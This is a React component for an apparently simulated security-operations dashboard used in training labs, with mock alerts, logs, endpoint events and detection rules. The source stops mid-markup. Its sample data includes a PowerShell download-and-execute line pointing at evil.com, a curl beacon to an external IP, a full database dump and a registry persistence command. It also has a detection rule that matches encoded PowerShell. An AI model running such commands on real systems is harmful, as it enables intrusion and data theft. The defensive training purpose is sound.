import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { 
  AlertTriangle, 
  Shield, 
  Activity, 
  FileText, 
  Clock, 
  ChevronRight,
  Search,
  Filter,
  Bell,
  Monitor,
  Network,
  CheckCircle2,
  XCircle,
  AlertCircle,
  Info,
  Zap,
  Eye,
  Terminal,
  Server,
  Globe,
  Code,
  Briefcase,
  MapPin,
  User,
  Building,
  ToggleLeft,
  ToggleRight
} from "lucide-react";
import { clsx } from "clsx";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";

interface SIEMAlert {
  id: string;
  timestamp: string;
  severity: "critical" | "high" | "medium" | "low" | "info";
  title: string;
  source: string;
  sourceIp?: string;
  destIp?: string;
  status: "new" | "investigating" | "escalated" | "resolved";
  description: string;
  category: string;
  mitreTactic?: string;
  mitreId?: string;
}

interface LogEntry {
  timestamp: string;
  level: "error" | "warn" | "info" | "debug";
  source: string;
  sourceType: "windows" | "linux" | "cloud" | "network" | "endpoint";
  eventId?: string;
  message: string;
  rawLog?: string;
  normalized: {
    eventType: string;
    user?: string;
    host?: string;
    ip?: string;
    process?: string;
    action?: string;
  };
  enrichment?: {
    geoip?: { country: string; city: string; isp: string };
    userContext?: { department: string; role: string; riskScore: number };
    assetCriticality?: "critical" | "high" | "medium" | "low";
    reputation?: "malicious" | "suspicious" | "clean" | "unknown";
  };
  details?: Record<string, string>;
}

interface NetworkEvent {
  timestamp: string;
  srcIp: string;
  destIp: string;
  srcPort: number;
  destPort: number;
  protocol: string;
  action: "allow" | "deny" | "alert";
  bytes: number;
  packets: number;
  direction: "inbound" | "outbound" | "internal";
  enrichment?: {
    srcGeo?: { country: string; city: string };
    destGeo?: { country: string; city: string };
    srcReputation?: string;
    destReputation?: string;
  };
}

interface EndpointActivity {
  hostname: string;
  timestamp: string;
  eventType: string;
  eventId: string;
  process?: string;
  parentProcess?: string;
  commandLine?: string;
  user?: string;
  hash?: string;
  status: "normal" | "suspicious" | "malicious";
  mitreTechnique?: string;
}

interface DetectionRule {
  id: string;
  name: string;
  description: string;
  severity: "critical" | "high" | "medium" | "low";
  enabled: boolean;
  logic: string;
  mitreId?: string;
  mitreTactic?: string;
  threshold?: { count: number; timeWindow: string };
  lastTriggered?: string;
  triggerCount: number;
}

interface Case {
  id: string;
  title: string;
  status: "open" | "investigating" | "pending" | "closed";
  priority: "critical" | "high" | "medium" | "low";
  assignee?: string;
  alertIds: string[];
  createdAt: string;
  updatedAt: string;
  notes: string[];
}

interface SOCDashboardProps {
  labId: number;
  labCategory: string;
  onAlertSelect?: (alertId: string) => void;
  selectedAlertId?: string;
  className?: string;
}

const generateMockAlerts = (labId: number): SIEMAlert[] => {
  const alertTemplates: SIEMAlert[] = [
    {
      id: "ALT-001",
      timestamp: new Date(Date.now() - 120000).toISOString(),
      severity: "critical",
      title: "Unauthorized API Key Usage Detected",
      source: "CloudTrail",
      sourceIp: "198.51.100.45",
      status: "new",
      description: "API calls detected from unrecognized IP address using admin credentials",
      category: "Credential Access",
      mitreTactic: "Credential Access",
      mitreId: "T1552"
    },
    {
      id: "ALT-002",
      timestamp: new Date(Date.now() - 300000).toISOString(),
      severity: "high",
      title: "S3 Bucket Policy Modified",
      source: "AWS Config",
      status: "new",
      description: "Production bucket ACL changed to public-read",
      category: "Data Exposure",
      mitreTactic: "Exfiltration",
      mitreId: "T1567"
    },
    {
      id: "ALT-003",
      timestamp: new Date(Date.now() - 600000).toISOString(),
      severity: "high",
      title: "Unusual EC2 Instance Launch",
      source: "GuardDuty",
      sourceIp: "10.0.1.50",
      status: "investigating",
      description: "Large GPU instances launched in unusual region (ap-south-1)",
      category: "Resource Abuse",
      mitreTactic: "Resource Hijacking",
      mitreId: "T1496"
    },
    {
      id: "ALT-004",
      timestamp: new Date(Date.now() - 900000).toISOString(),
      severity: "medium",
      title: "Failed Login Attempts Spike",
      source: "IAM",
      sourceIp: "203.0.113.100",
      status: "new",
      description: "50+ failed login attempts in 5 minutes for user 'admin'",
      category: "Brute Force",
      mitreTactic: "Credential Access",
      mitreId: "T1110"
    },
    {
      id: "ALT-005",
      timestamp: new Date(Date.now() - 1200000).toISOString(),
      severity: "medium",
      title: "Security Group Rule Added",
      source: "VPC Flow Logs",
      status: "new",
      description: "Ingress rule 0.0.0.0/0:22 added to production security group",
      category: "Network",
      mitreTactic: "Persistence",
      mitreId: "T1098"
    },
    {
      id: "ALT-006",
      timestamp: new Date(Date.now() - 1800000).toISOString(),
      severity: "low",
      title: "New IAM Role Created",
      source: "CloudTrail",
      status: "resolved",
      description: "Role 'LambdaExecutionRole' created with S3 full access",
      category: "IAM Changes",
      mitreTactic: "Privilege Escalation",
      mitreId: "T1078"
    },
    {
      id: "ALT-007",
      timestamp: new Date(Date.now() - 2400000).toISOString(),
      severity: "info",
      title: "CloudTrail Log Delivery",
      source: "CloudTrail",
      status: "resolved",
      description: "Log delivery resumed to S3 bucket after brief interruption",
      category: "Monitoring",
      mitreTactic: "Defense Evasion"
    }
  ];
  
  return alertTemplates.slice(0, 5 + (labId % 3));
};

const generateMockLogs = (): LogEntry[] => {
  return [
    // Windows Security Events
    {
      timestamp: new Date(Date.now() - 5000).toISOString(),
      level: "error",
      source: "DC01.corp.local",
      sourceType: "windows",
      eventId: "4625",
      message: "An account failed to log on",
      rawLog: "EventID=4625 LogonType=3 TargetUserName=Administrator FailureReason=%%2313 IpAddress=198.51.100.45",
      normalized: { eventType: "Authentication Failure", user: "Administrator", host: "DC01", ip: "198.51.100.45", action: "failure" },
      enrichment: { geoip: { country: "Russia", city: "Moscow", isp: "Evil Corp ISP" }, reputation: "malicious", assetCriticality: "critical" },
      details: { LogonType: "3 (Network)", FailureReason: "Unknown user name or bad password" }
    },
    {
      timestamp: new Date(Date.now() - 15000).toISOString(),
      level: "warn",
      source: "DC01.corp.local",
      sourceType: "windows",
      eventId: "4768",
      message: "Kerberos authentication ticket (TGT) was requested",
      rawLog: "EventID=4768 TargetUserName=svc_backup PreAuthType=0x0 IpAddress=10.0.1.50",
      normalized: { eventType: "Kerberos TGT Request", user: "svc_backup", host: "DC01", ip: "10.0.1.50", action: "success" },
      enrichment: { userContext: { department: "IT", role: "Service Account", riskScore: 75 }, assetCriticality: "critical" },
      details: { PreAuthType: "0 (Logon without Pre-Auth)", ServiceName: "krbtgt" }
    },
    {
      timestamp: new Date(Date.now() - 25000).toISOString(),
      level: "error",
      source: "WS-FINANCE-01",
      sourceType: "windows",
      eventId: "4688",
      message: "A new process has been created",
      rawLog: "EventID=4688 NewProcessName=powershell.exe CommandLine=IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
      normalized: { eventType: "Process Creation", user: "jsmith", host: "WS-FINANCE-01", process: "powershell.exe", action: "execute" },
      enrichment: { userContext: { department: "Finance", role: "Analyst", riskScore: 90 }, assetCriticality: "high", reputation: "malicious" },
      details: { ParentProcess: "cmd.exe", CommandLine: "IEX(New-Object Net.WebClient).DownloadString(...)" }
    },
    // Linux Syslog
    {
      timestamp: new Date(Date.now() - 35000).toISOString(),
      level: "warn",
      source: "web-server-01",
      sourceType: "linux",
      eventId: "sshd",
      message: "Failed password for invalid user admin from 203.0.113.100 port 54321 ssh2",
      rawLog: "Dec 29 12:34:56 web-server-01 sshd[12345]: Failed password for invalid user admin from 203.0.113.100",
      normalized: { eventType: "SSH Auth Failure", user: "admin (invalid)", host: "web-server-01", ip: "203.0.113.100", action: "failure" },
      enrichment: { geoip: { country: "China", city: "Beijing", isp: "China Telecom" }, reputation: "suspicious" },
      details: { facility: "auth", port: "54321", protocol: "ssh2" }
    },
    {
      timestamp: new Date(Date.now() - 45000).toISOString(),
      level: "error",
      source: "db-server-01",
      sourceType: "linux",
      eventId: "sudo",
      message: "user NOT in sudoers; TTY=pts/0; PWD=/home/contractor; USER=root; COMMAND=/bin/bash",
      rawLog: "Dec 29 12:34:00 db-server-01 sudo: contractor : user NOT in sudoers",
      normalized: { eventType: "Privilege Escalation Attempt", user: "contractor", host: "db-server-01", process: "sudo", action: "denied" },
      enrichment: { userContext: { department: "External", role: "Contractor", riskScore: 85 }, assetCriticality: "critical" },
      details: { targetUser: "root", command: "/bin/bash" }
    },
    // Cloud Telemetry (AWS CloudTrail)
    {
      timestamp: new Date(Date.now() - 55000).toISOString(),
      level: "error",
      source: "CloudTrail",
      sourceType: "cloud",
      eventId: "DeleteTrail",
      message: "CloudTrail trail 'security-logs' was deleted by user 'compromised-admin'",
      rawLog: '{"eventSource":"cloudtrail.amazonaws.com","eventName":"DeleteTrail","userIdentity":{"userName":"compromised-admin"}}',
      normalized: { eventType: "Defense Evasion", user: "compromised-admin", action: "delete" },
      enrichment: { geoip: { country: "Romania", city: "Bucharest", isp: "Bulletproof Hosting" }, reputation: "malicious", assetCriticality: "critical" },
      details: { eventSource: "cloudtrail.amazonaws.com", trailName: "security-logs", sourceIPAddress: "185.220.101.45" }
    },
    {
      timestamp: new Date(Date.now() - 65000).toISOString(),
      level: "warn",
      source: "CloudTrail",
      sourceType: "cloud",
      eventId: "ConsoleLogin",
      message: "AWS Console login from unusual location (first seen from this country)",
      rawLog: '{"eventSource":"signin.amazonaws.com","eventName":"ConsoleLogin","sourceIPAddress":"178.128.45.67"}',
      normalized: { eventType: "Anomalous Login", user: "dev-user", ip: "178.128.45.67", action: "success" },
      enrichment: { geoip: { country: "Netherlands", city: "Amsterdam", isp: "DigitalOcean" }, userContext: { department: "Engineering", role: "Developer", riskScore: 65 }, reputation: "suspicious" },
      details: { mfaUsed: "No", userAgent: "Mozilla/5.0 (Windows NT 10.0)" }
    },
    {
      timestamp: new Date(Date.now() - 75000).toISOString(),
      level: "info",
      source: "GuardDuty",
      sourceType: "cloud",
      eventId: "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration",
      message: "Credentials from EC2 instance i-0abc123def456 being used from external IP",
      rawLog: '{"type":"UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS","resource":{"instanceId":"i-0abc123def456"}}',
      normalized: { eventType: "Credential Theft", ip: "45.33.32.156", action: "exfiltration" },
      enrichment: { geoip: { country: "USA", city: "Fremont", isp: "Linode" }, reputation: "suspicious", assetCriticality: "high" },
      details: { instanceId: "i-0abc123def456", externalIp: "45.33.32.156" }
    },
    // Network/Firewall Logs
    {
      timestamp: new Date(Date.now() - 85000).toISOString(),
      level: "warn",
      source: "VPC-Flow",
      sourceType: "network",
      eventId: "REJECT",
      message: "Rejected connection attempt to database port from internet",
      rawLog: "2 123456789012 eni-abc123 198.51.100.77 10.0.2.50 52419 3306 6 1 40 REJECT OK",
      normalized: { eventType: "Blocked Connection", ip: "198.51.100.77", host: "10.0.2.50", action: "reject" },
      enrichment: { geoip: { country: "Brazil", city: "Sao Paulo", isp: "Unknown" }, reputation: "malicious" },
      details: { srcPort: "52419", dstPort: "3306 (MySQL)", protocol: "TCP" }
    }
  ];
};

const generateNetworkEvents = (): NetworkEvent[] => {
  return [
    { 
      timestamp: new Date(Date.now() - 10000).toISOString(), 
      srcIp: "10.0.1.50", destIp: "198.51.100.45", 
      srcPort: 54321, destPort: 443, 
      protocol: "HTTPS", action: "allow", bytes: 15234, packets: 45,
      direction: "outbound",
      enrichment: { destGeo: { country: "USA", city: "Ashburn" }, destReputation: "clean" }
    },
    { 
      timestamp: new Date(Date.now() - 20000).toISOString(), 
      srcIp: "198.51.100.45", destIp: "10.0.1.50", 
      srcPort: 4444, destPort: 22, 
      protocol: "SSH", action: "alert", bytes: 8456, packets: 120,
      direction: "inbound",
      enrichment: { srcGeo: { country: "Russia", city: "Moscow" }, srcReputation: "malicious" }
    },
    { 
      timestamp: new Date(Date.now() - 30000).toISOString(), 
      srcIp: "10.0.2.100", destIp: "185.220.101.45", 
      srcPort: 49152, destPort: 3333, 
      protocol: "TCP", action: "deny", bytes: 0, packets: 3,
      direction: "outbound",
      enrichment: { destGeo: { country: "Romania", city: "Bucharest" }, destReputation: "malicious" }
    },
    { 
      timestamp: new Date(Date.now() - 40000).toISOString(), 
      srcIp: "10.0.1.25", destIp: "52.216.109.45", 
      srcPort: 55555, destPort: 443, 
      protocol: "HTTPS", action: "allow", bytes: 2456000, packets: 1500,
      direction: "outbound",
      enrichment: { destGeo: { country: "USA", city: "Ashburn" }, destReputation: "clean" }
    },
    { 
      timestamp: new Date(Date.now() - 50000).toISOString(), 
      srcIp: "203.0.113.50", destIp: "10.0.1.10", 
      srcPort: 12345, destPort: 3389, 
      protocol: "RDP", action: "deny", bytes: 0, packets: 5,
      direction: "inbound",
      enrichment: { srcGeo: { country: "China", city: "Shanghai" }, srcReputation: "suspicious" }
    },
    { 
      timestamp: new Date(Date.now() - 60000).toISOString(), 
      srcIp: "10.0.1.50", destIp: "10.0.2.50", 
      srcPort: 49200, destPort: 445, 
      protocol: "SMB", action: "allow", bytes: 45000, packets: 200,
      direction: "internal",
      enrichment: {}
    }
  ];
};

const generateEndpointActivity = (): EndpointActivity[] => {
  return [
    { 
      hostname: "WS-FINANCE-01", 
      timestamp: new Date(Date.now() - 15000).toISOString(), 
      eventType: "Process Creation", 
      eventId: "4688",
      process: "powershell.exe", 
      parentProcess: "cmd.exe",
      commandLine: "powershell.exe -enc SQBFAFgA...",
      user: "jsmith", 
      hash: "a1b2c3d4e5f6...",
      status: "malicious",
      mitreTechnique: "T1059.001"
    },
    { 
      hostname: "DC01", 
      timestamp: new Date(Date.now() - 25000).toISOString(), 
      eventType: "Logon", 
      eventId: "4624",
      user: "svc_backup", 
      status: "suspicious",
      mitreTechnique: "T1078"
    },
    { 
      hostname: "web-server-01", 
      timestamp: new Date(Date.now() - 35000).toISOString(), 
      eventType: "Network Connection", 
      eventId: "3",
      process: "curl", 
      parentProcess: "bash",
      commandLine: "curl -s http://185.220.101.45/beacon",
      user: "www-data", 
      status: "malicious",
      mitreTechnique: "T1071.001"
    },
    { 
      hostname: "db-server-01", 
      timestamp: new Date(Date.now() - 45000).toISOString(), 
      eventType: "File Access", 
      eventId: "11",
      process: "mysqldump", 
      parentProcess: "bash",
      commandLine: "mysqldump --all-databases > /tmp/dump.sql",
      user: "root", 
      status: "suspicious",
      mitreTechnique: "T1005"
    },
    { 
      hostname: "app-server-02", 
      timestamp: new Date(Date.now() - 55000).toISOString(), 
      eventType: "Registry Modify", 
      eventId: "13",
      process: "reg.exe", 
      parentProcess: "cmd.exe",
      commandLine: "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
      user: "SYSTEM", 
      status: "malicious",
      mitreTechnique: "T1547.001"
    },
    { 
      hostname: "bastion-01", 
      timestamp: new Date(Date.now() - 65000).toISOString(), 
      eventType: "SSH Login", 
      eventId: "accepted",
      user: "admin", 
      status: "normal"
    }
  ];
};

const generateDetectionRules = (): DetectionRule[] => {
  return [
    {
      id: "DET-001",
      name: "Brute Force Detection",
      description: "Detects multiple failed login attempts followed by success",
      severity: "high",
      enabled: true,
      logic: "count(EventID=4625) > 5 within 5m THEN EventID=4624 from same IP",
      mitreId: "T1110",
      mitreTactic: "Credential Access",
      threshold: { count: 5, timeWindow: "5m" },
      lastTriggered: new Date(Date.now() - 300000).toISOString(),
      triggerCount: 23
    },
    {
      id: "DET-002",
      name: "Impossible Travel",
      description: "Login from geographically impossible locations within short timeframe",
      severity: "critical",
      enabled: true,
      logic: "login_1.geo != login_2.geo AND time_diff < 2h AND distance > 500mi",
      mitreId: "T1078",
      mitreTactic: "Initial Access",
      threshold: { count: 1, timeWindow: "2h" },
      lastTriggered: new Date(Date.now() - 7200000).toISOString(),
      triggerCount: 5
    },
    {
      id: "DET-003",
      name: "Suspicious PowerShell Execution",
      description: "Encoded PowerShell commands or known malicious patterns",
      severity: "high",
      enabled: true,
      logic: "process=powershell.exe AND (cmdline contains '-enc' OR cmdline contains 'IEX' OR cmdline contains 'DownloadString')",
      mitreId: "T1059.001",
      mitreTactic: "Execution",
      triggerCount: 47
    },
    {
      id: "DET-004",
      name: "CloudTrail Tampering",
      description: "Attempts to disable or delete CloudTrail logging",
      severity: "critical",
      enabled: true,
      logic: "eventName IN ('DeleteTrail', 'StopLogging', 'UpdateTrail') AND NOT user IN whitelist",
      mitreId: "T1562.008",
      mitreTactic: "Defense Evasion",
      triggerCount: 3
    },
    {
      id: "DET-005",
      name: "Lateral Movement via SMB",
      description: "Internal SMB connections to multiple hosts in short time",
      severity: "medium",
      enabled: true,
      logic: "dest_port=445 AND unique(dest_ip) > 5 within 10m",
      mitreId: "T1021.002",
      mitreTactic: "Lateral Movement",
      threshold: { count: 5, timeWindow: "10m" },
      triggerCount: 12
    },
    {
      id: "DET-006",
      name: "Crypto Mining Activity",
      description: "Connections to known mining pools or high GPU usage",
      severity: "medium",
      enabled: true,
      logic: "dest contains 'pool.' OR dest contains 'mining' OR process='xmrig'",
      mitreId: "T1496",
      mitreTactic: "Impact",
      triggerCount: 8
    }
  ];
};

const generateCases = (): Case[] => {
  return [
    {
      id: "CASE-2024-001",
      title: "Credential Compromise Investigation",
      status: "investigating",
      priority: "critical",
      assignee: "analyst-1",
      alertIds: ["ALT-001", "ALT-004"],
      createdAt: new Date(Date.now() - 3600000).toISOString(),
      updatedAt: new Date(Date.now() - 600000).toISOString(),
      notes: ["Initial triage complete", "User credentials rotated", "Awaiting forensics review"]
    },
    {
      id: "CASE-2024-002",
      title: "Potential Data Exfiltration",
      status: "open",
      priority: "high",
      alertIds: ["ALT-002"],
      createdAt: new Date(Date.now() - 1800000).toISOString(),
      updatedAt: new Date(Date.now() - 1800000).toISOString(),
      notes: ["S3 bucket permissions reviewed"]
    },
    {
      id: "CASE-2024-003",
      title: "Cryptomining Malware",
      status: "pending",
      priority: "medium",
      assignee: "analyst-2",
      alertIds: ["ALT-003"],
      createdAt: new Date(Date.now() - 86400000).toISOString(),
      updatedAt: new Date(Date.now() - 43200000).toISOString(),
      notes: ["Instance isolated", "Malware sample captured", "Pending IR team review"]
    }
  ];
};

const severityConfig = {
  critical: { color: "bg-red-500/10 text-red-300/80 border-red-500/20", icon: XCircle, priority: 1 },
  high: { color: "bg-orange-500/10 text-orange-300/80 border-orange-500/20", icon: AlertTriangle, priority: 2 },
  medium: { color: "bg-yellow-500/10 text-yellow-300/80 border-yellow-500/20", icon: AlertCircle, priority: 3 },
  low: { color: "bg-blue-500/10 text-blue-300/80 border-blue-500/20", icon: Info, priority: 4 },
  info: { color: "bg-slate-500/10 text-slate-300/80 border-slate-500/20", icon: Info, priority: 5 }
};

const statusConfig = {
  new: { color: "bg-red-500/15 text-red-200/80", label: "NEW" },
  investigating: { color: "bg-yellow-500/15 text-yellow-200/80", label: "INVESTIGATING" },
  escalated: { color: "bg-purple-500/15 text-purple-200/80", label: "ESCALATED" },
  resolved: { color: "bg-green-500/15 text-green-200/80", label: "RESOLVED" }
};

// Alert-specific investigation and remediation commands
const getInvestigationCommands = (alert: SIEMAlert): string[] => {
  const commands: string[] = ["scan"];
  
  switch (alert.id) {
    case "ALT-001": // Unauthorized API Key Usage
      commands.push(
        "aws cloudtrail lookup-events",
        `aws iam get-credential-report`,
        alert.sourceIp ? `siem correlate-logs cloudtrail vpc-flow --ip ${alert.sourceIp}` : "siem correlate-logs cloudtrail vpc-flow"
      );
      break;
    case "ALT-002": // S3 Bucket Policy Modified
      commands.push(
        "aws s3 ls",
        "aws s3 get-bucket-policy",
        "aws cloudtrail lookup-events --s3"
      );
      break;
    case "ALT-003": // Unusual EC2 Instance Launch
      commands.push(
        "aws ec2 ls",
        "aws guardduty list-findings",
        "aws cloudtrail lookup-events --ec2"
      );
      break;
    case "ALT-004": // Failed Login Attempts Spike
      commands.push(
        "aws iam list-users",
        "aws cloudtrail lookup-events --username admin",
        `siem analyze-pattern failed-logins`
      );
      break;
    case "ALT-005": // Security Group Rule Added
      commands.push(
        "aws ec2 ls-sg",
        "aws ec2 describe-sg prod-sg",
        "aws cloudtrail lookup-events --sg"
      );
      break;
    case "ALT-006": // New IAM Role Created
      commands.push(
        "aws iam list-roles",
        "aws cloudtrail lookup-events --iam",
        "aws iam analyze-policies"
      );
      break;
    default:
      commands.push(
        "aws cloudtrail lookup-events",
        "siem show-alerts --status pending"
      );
  }
  
  return commands;
};

const getRemediationCommands = (alert: SIEMAlert): string[] => {
  switch (alert.id) {
    case "ALT-001": // Unauthorized API Key Usage
      return [
        "aws iam revoke-credentials compromised-key",
        "aws iam enforce-mfa-policy",
        "security generate-incident-report"
      ];
    case "ALT-002": // S3 Bucket Policy Modified
      return [
        "aws s3 fix production-bucket",
        "aws s3 enable-block-public-access production-bucket",
        "aws cloudtrail enable-data-events"
      ];
    case "ALT-003": // Unusual EC2 Instance Launch
      return [
        "aws ec2 terminate suspicious-instance",
        "aws ec2 revoke-launch-permissions",
        "aws guardduty enable-enhanced"
      ];
    case "ALT-004": // Failed Login Attempts Spike
      return [
        "aws iam lock-account admin",
        "aws waf add-ip-blocklist 203.0.113.100",
        "siem create-rule brute-force-detection"
      ];
    case "ALT-005": // Security Group Rule Added
      return [
        "aws ec2 restrict-ssh prod-instance",
        "aws ec2 restrict-sg prod-sg",
        "aws config enable-sg-monitoring"
      ];
    case "ALT-006": // New IAM Role Created
      return [
        "aws iam review-role LambdaExecutionRole",
        "aws iam apply-permission-boundaries",
        "aws cloudtrail create-iam-alerts"
      ];
    case "ALT-007": // CloudWatch Alarm Triggered
      return [
        "aws cloudwatch acknowledge-alarm",
        "aws ec2 scale-down",
        "aws budgets set-alert"
      ];
    default:
      return [
        "security remediate-critical",
        "security generate-assessment-report"
      ];
  }
};

export function SOCDashboard({ labId, labCategory, onAlertSelect, selectedAlertId, className }: SOCDashboardProps) {
  const [alerts, setAlerts] = useState<SIEMAlert[]>([]);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [networkEvents, setNetworkEvents] = useState<NetworkEvent[]>([]);
  const [endpointActivity, setEndpointActivity] = useState<EndpointActivity[]>([]);
  const [detectionRules, setDetectionRules] = useState<DetectionRule[]>([]);
  const [cases, setCases] = useState<Case[]>([]);
  const [activeTab, setActiveTab] = useState("alerts");
  const [filterSeverity, setFilterSeverity] = useState<string>("all");
  const [logSourceFilter, setLogSourceFilter] = useState<string>("all");

  useEffect(() => {
    setAlerts(generateMockAlerts(labId));
    setLogs(generateMockLogs());
    setNetworkEvents(generateNetworkEvents());
    setEndpointActivity(generateEndpointActivity());
    setDetectionRules(generateDetectionRules());
    setCases(generateCases());
  }, [labId]);
  
  const filteredLogs = logs.filter(l => 
    logSourceFilter === "all" || l.sourceType === logSourceFilter
  );

  const filteredAlerts = alerts.filter(a => 
    filterSeverity === "all" || a.severity === filterSeverity
  );

  const criticalCount = alerts.filter(a => a.severity === "critical" && a.status === "new").length;
  const highCount = alerts.filter(a => a.severity === "high" && a.status === "new").length;
  const newCount = alerts.filter(a => a.status === "new").length;

  const formatTime = (isoString: string) => {
    const date = new Date(isoString);
    return date.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
  };

  const formatTimeAgo = (isoString: string) => {
    const seconds = Math.floor((Date.now() - new Date(isoString).getTime()) / 1000);
    if (seconds < 60) return `${seconds}s ago`;
    if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
    return `${Math.floor(seconds / 3600)}h ago`;
  };

  return (
    <div className={clsx("flex flex-col h-full bg-gradient-to-b from-card/80 to-card/40 border border-border/50 rounded-xl backdrop-blur-sm overflow-hidden", className)}>
      <div className="flex items-center justify-between px-4 py-2 border-b border-primary/20 bg-black/40">
        <div className="flex items-center gap-3">
          <motion.div
            className="w-2 h-2 rounded-full bg-primary"
            animate={{ opacity: [1, 0.4, 1] }}
            transition={{ duration: 1.5, repeat: Infinity }}
          />
          <span className="text-xs font-mono text-primary uppercase tracking-wider font-bold">SOC Command Center</span>
        </div>
        <div className="flex items-center gap-2">
          {criticalCount > 0 && (
            <Badge variant="destructive" className="text-[10px] animate-pulse">
              {criticalCount} CRITICAL
            </Badge>
          )}
          {highCount > 0 && (
            <Badge className="bg-orange-500/20 text-orange-400 border-orange-500/40 text-[10px]">
              {highCount} HIGH
            </Badge>
          )}
          <Badge variant="outline" className="text-[10px]">
            <Bell className="w-3 h-3 mr-1" />
            {newCount} New
          </Badge>
        </div>
      </div>

      <Tabs value={activeTab} onValueChange={setActiveTab} className="flex-1 flex flex-col min-h-0 overflow-hidden">
        <TabsList className="w-full justify-start rounded-none border-b border-white/10 bg-black/20 px-2 overflow-x-auto flex-nowrap flex-shrink-0">
          <TabsTrigger value="alerts" className="text-[10px] font-mono gap-1 data-[state=active]:bg-primary/20 data-[state=active]:text-primary">
            <AlertTriangle className="w-3 h-3" /> ALERTS
          </TabsTrigger>
          <TabsTrigger value="logs" className="text-[10px] font-mono gap-1 data-[state=active]:bg-primary/20 data-[state=active]:text-primary">
            <FileText className="w-3 h-3" /> LOGS
          </TabsTrigger>
          <TabsTrigger value="detections" className="text-[10px] font-mono gap-1 data-[state=active]:bg-primary/20 data-[state=active]:text-primary">
            <Code className="w-3 h-3" /> DETECTIONS
          </TabsTrigger>
          <TabsTrigger value="cases" className="text-[10px] font-mono gap-1 data-[state=active]:bg-primary/20 data-[state=active]:text-primary">
            <Briefcase className="w-3 h-3" /> CASES
          </TabsTrigger>
          <TabsTrigger value="network" className="text-[10px] font-mono gap-1 data-[state=active]:bg-primary/20 data-[state=active]:text-primary">
            <Network className="w-3 h-3" /> NETWORK
          </TabsTrigger>
          <TabsTrigger value="endpoints" className="text-[10px] font-mono gap-1 data-[state=active]:bg-primary/20 data-[state=active]:text-primary">
            <Monitor className="w-3 h-3" /> ENDPOINTS
          </TabsTrigger>
        </TabsList>

        <div className="flex-1 relative min-h-0">
        <TabsContent value="alerts" className="absolute inset-0 m-0 overflow-hidden data-[state=inactive]:pointer-events-none data-[state=inactive]:hidden">
          <div className="flex h-full">
            {/* Alert List */}
            <div className={clsx("flex flex-col transition-all duration-300", selectedAlertId ? "w-1/2 border-r border-white/10" : "w-full")}>
              <div className="flex items-center gap-2 px-3 py-2 border-b border-white/5">
                <Filter className="w-3 h-3 text-muted-foreground" />
                <div className="flex gap-1">
                  {["all", "critical", "high", "medium", "low"].map(sev => (
                    <button
                      key={sev}
                      onClick={() => setFilterSeverity(sev)}
                      className={clsx(
                        "px-2 py-0.5 text-[9px] font-mono rounded uppercase transition-all",
                        filterSeverity === sev 
                          ? "bg-primary/20 text-primary border border-primary/40" 
                          : "text-muted-foreground hover:text-white"
                      )}
                      data-testid={`filter-${sev}`}
                    >
                      {sev}
                    </button>
                  ))}
                </div>
              </div>
              <ScrollArea className="flex-1">
                <div className="p-2 space-y-2">
                  <AnimatePresence>
                    {filteredAlerts.map((alert, idx) => {
                      const config = severityConfig[alert.severity];
                      const Icon = config.icon;
                      const isSelected = selectedAlertId === alert.id;
                      return (
                        <motion.div
                          key={alert.id}
                          initial={{ opacity: 0, x: -10 }}
                          animate={{ opacity: 1, x: 0 }}
                          exit={{ opacity: 0, x: 10 }}
                          transition={{ delay: idx * 0.03 }}
                          onClick={() => onAlertSelect?.(alert.id)}
                          className={clsx(
                            "p-3 rounded-lg border cursor-pointer transition-all",
                            isSelected ? "bg-primary/10 border-primary/60 ring-1 ring-primary/50" : "bg-black/30 border-white/10 hover:border-white/20 hover:bg-black/50",
                            alert.status === "new" && alert.severity === "critical" && !isSelected && "animate-pulse"
                          )}
                          data-testid={`alert-${alert.id}`}
                        >
                          <div className="flex items-start gap-3">
                            <div className={clsx("p-1.5 rounded", config.color)}>
                              <Icon className="w-3.5 h-3.5" />
                            </div>
                            <div className="flex-1 min-w-0">
                              <div className="flex items-center gap-2 mb-1 flex-wrap">
                                <span className="text-[10px] font-mono text-muted-foreground">{alert.id}</span>
                                <Badge className={clsx("text-[8px] px-1.5 py-0", statusConfig[alert.status].color)}>
                                  {statusConfig[alert.status].label}
                                </Badge>
                                {alert.mitreId && (
                                  <Badge variant="outline" className="text-[8px] px-1.5 py-0 text-cyan-400 border-cyan-400/30">
                                    {alert.mitreId}
                                  </Badge>
                                )}
                              </div>
                              <h4 className="text-xs font-bold text-white mb-1 truncate">{alert.title}</h4>
                              <p className="text-[10px] text-muted-foreground line-clamp-2">{alert.description}</p>
                              <div className="flex items-center gap-3 mt-2 text-[9px] text-muted-foreground flex-wrap">
                                <span className="flex items-center gap-1">
                                  <Clock className="w-2.5 h-2.5" /> {formatTimeAgo(alert.timestamp)}
                                </span>
                                <span className="flex items-center gap-1">
                                  <Server className="w-2.5 h-2.5" /> {alert.source}
                                </span>
                                {alert.sourceIp && (
                                  <span className="flex items-center gap-1">
                                    <Globe className="w-2.5 h-2.5" /> {alert.sourceIp}
                                  </span>
                                )}
                              </div>
                            </div>
                            <ChevronRight className={clsx("w-4 h-4 transition-transform", isSelected ? "text-primary rotate-90" : "text-muted-foreground")} />
                          </div>
                        </motion.div>
                      );
                    })}
                  </AnimatePresence>
                </div>
              </ScrollArea>
            </div>

            {/* Investigation Panel */}
            <AnimatePresence>
              {selectedAlertId && (() => {
                const selectedAlert = alerts.find(a => a.id === selectedAlertId);
                if (!selectedAlert) return null;
                const config = severityConfig[selectedAlert.severity];
                const Icon = config.icon;
                return (
                  <motion.div
                    initial={{ opacity: 0, x: 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: 20 }}
                    className="w-1/2 flex flex-col bg-black/40 overflow-hidden"
                  >
                    <div className="px-3 py-2 border-b border-white/10 bg-black/40 flex items-center justify-between gap-2">
                      <div className="flex items-center gap-2">
                        <Eye className="w-4 h-4 text-primary" />
